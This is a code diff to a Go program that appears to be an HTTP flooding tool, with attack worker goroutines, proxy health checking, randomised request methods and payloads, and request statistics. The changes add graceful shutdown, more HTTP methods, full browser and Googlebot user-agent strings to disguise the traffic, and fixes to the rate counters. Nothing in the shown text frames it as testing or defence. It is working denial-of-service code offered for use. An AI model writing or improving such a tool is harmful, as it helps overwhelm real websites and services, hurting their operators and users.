@@ -13,11 +13,13 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"os/signal"
 	"strconv"
 	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
+	"syscall"
 )
 
 // #################### CONFIG ####################
@@ -69,13 +71,21 @@ func main() {
 	go printStats()
 	go proxyHealthChecker()
 
+	// Graceful shutdown
+	stop := make(chan os.Signal, 1)
+	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)
 	var wg sync.WaitGroup
 	for i := 0; i < threads; i++ {
 		wg.Add(1)
 		go attackWorker(&wg)
 	}
 
-	time.Sleep(time.Duration(duration) * time.Second)
+	select {
+	case <-time.After(time.Duration(duration) * time.Second):
+		// normal end
+	case <-stop:
+		log.Println("\n🛑 Получен сигнал завершения. Ожидание завершения воркеров...")
+	}
 	wg.Wait()
 
 	printFinalStats()
@@ -287,22 +297,33 @@ func attackWorker(wg *sync.WaitGroup) {
 }
 
 func randomMethod() string {
-	methods := []string{"GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"}
+	methods := []string{"GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH", "TRACE", "CONNECT"}
 	return methods[rand.Intn(len(methods))]
 }
 
 func randomUserAgent() string {
 	agents := []string{
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-		"iPhone; CPU iPhone OS 15_0 like Mac OS X",
-		"Linux; Android 12; SM-S901B",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
+		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
+		"Mozilla/5.0 (Linux; Android 12; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
+		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+		"curl/7.68.0",
+		"Wget/1.20.3 (linux-gnu)",
 	}
 	return agents[rand.Intn(len(agents))]
 }
 
 func randomPayload() []byte {
+	if payloadSize <= 0 {
+		return []byte("ping")
+	}
 	b := make([]byte, payloadSize)
-	rand.Read(b)
+	if _, err := rand.Read(b); err != nil {
+		copy(b, []byte("fallback-payload"))
+	}
 	return b
 }
 
@@ -352,17 +373,20 @@ func printStats() {
 		total := atomic.LoadUint64(&stats.TotalRequests)
 		failed := atomic.LoadUint64(&stats.FailedRequests)
 		success := total - failed
-		rate := float64(success) / float64(total) * 100
-		if total == 0 {
-			rate = 0
+		var rate float64
+		if total > 0 {
+			rate = float64(success) / float64(total) * 100
 		}
 
 		elapsed := time.Since(stats.StartTime).Seconds()
-		rps := float64(total) / elapsed
+		var rps float64
+		if elapsed > 0 {
+			rps = float64(total) / elapsed
+		}
 		active := atomic.LoadInt32(&stats.ActiveWorkers)
 
-		log.Printf("📊 Reqs: %d (%.1f/s) | Active: %d | Success: %.1f%%",
-			total, rps, active, rate)
+		log.Printf("📊 Reqs: %d (%.1f/s) | Active: %d | Success: %.1f%% | Failed: %d",
+			total, rps, active, rate, failed)
 	}
 }
 
